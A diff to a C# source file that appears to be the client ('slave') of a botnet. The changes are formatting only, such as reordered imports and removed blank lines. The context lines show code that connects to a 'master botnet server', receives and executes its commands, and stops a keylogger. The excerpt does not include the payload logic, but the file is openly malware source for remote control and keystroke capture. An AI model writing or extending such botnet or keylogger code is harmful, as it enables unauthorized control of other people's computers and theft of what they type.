@@ -1,9 +1,9 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Threading;
-using Shared;
+﻿using Shared;
 using Slave.Botnet;
 using Slave.Commands.Core;
+using System;
+using System.Collections.Generic;
+using System.Threading;
 
 namespace Slave.Core
 {
@@ -46,7 +46,6 @@ namespace Slave.Core
             set => _connectionRetryCount = value > _connectionRetryCount ? 10 : value;
         }
 
-
         /// <summary>
         /// Constructor checks if another instance of the application is already running,
         /// if there is one, close itself and let the already started one live
@@ -60,7 +59,6 @@ namespace Slave.Core
                 Environment.Exit(0);
             }
         }
-
 
         /// <summary>
         /// Entry point of the slave manager, call the master botnet server to acquire instructions.
@@ -103,7 +101,6 @@ namespace Slave.Core
             }
         }
 
-
         /// <summary>
         /// Entry point of the slave manager, call the RunSlave() method
         /// </summary>
@@ -130,7 +127,6 @@ namespace Slave.Core
             }
         }
 
-
         /// <summary>
         /// Call the SlaveNetworkManager ConnectToMaster method, if the connection is succesfull,
         /// start to listen for incoming commands from the master.
@@ -153,12 +149,11 @@ namespace Slave.Core
             {
                 var incomingData = networkManager.ReadLine();
                 // A simple dot beeing received is the master's connection monitoring sending a hearthbeat message
-                if(incomingData == ".")
+                if (incomingData == ".")
                     continue;
                 ProcessCommand(incomingData);
             }
         }
-
 
         /// <summary>
         /// Process a string that was already processed by the master sending it, so it's a valid command
@@ -197,7 +192,6 @@ namespace Slave.Core
             }
         }
 
-
         /// <summary>
         /// Close network stream and stop the keylogger listening as well
         /// </summary>
@@ -213,7 +207,6 @@ namespace Slave.Core
                 // ignored
             }
         }
-
 
         /// <summary>
         /// Exit the program
